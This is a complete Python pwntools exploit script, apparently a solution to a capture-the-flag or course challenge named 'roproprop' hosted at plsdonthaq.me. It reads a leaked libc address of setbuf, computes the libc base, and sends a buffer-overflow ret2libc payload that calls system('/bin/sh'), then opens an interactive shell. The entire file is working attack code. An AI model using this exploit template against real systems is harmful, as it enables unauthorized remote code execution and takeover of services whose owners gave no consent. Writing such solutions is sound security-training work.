from pwn import *

PROG_NAME = "./roproprop"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 6003
REMOTE_LIBC = "./libc-2.23.so"
LOCAL_LIBC = "/lib32/libc.so.6"

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
    libc = ELF(REMOTE_LIBC)
else:
    p = process(PROG_NAME)
    elf = p.elf
    libc = ELF(LOCAL_LIBC)

#gdb.attach(p, ''' break joke''')

p.recvuntil("- ")
# the pointer we're given is a libc leak of setbuf
setbuf_leak = int(p.recvline()[:-3], 16)
p.recvline()

libc_base = setbuf_leak - libc.symbols['setbuf']
libc.address = libc_base
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

payload = b'A'*(0x4ca+0x4)
payload += p32(system_addr)
payload += b'BBBB'
payload += p32(binsh_addr)

p.sendline(payload)

p.interactive()
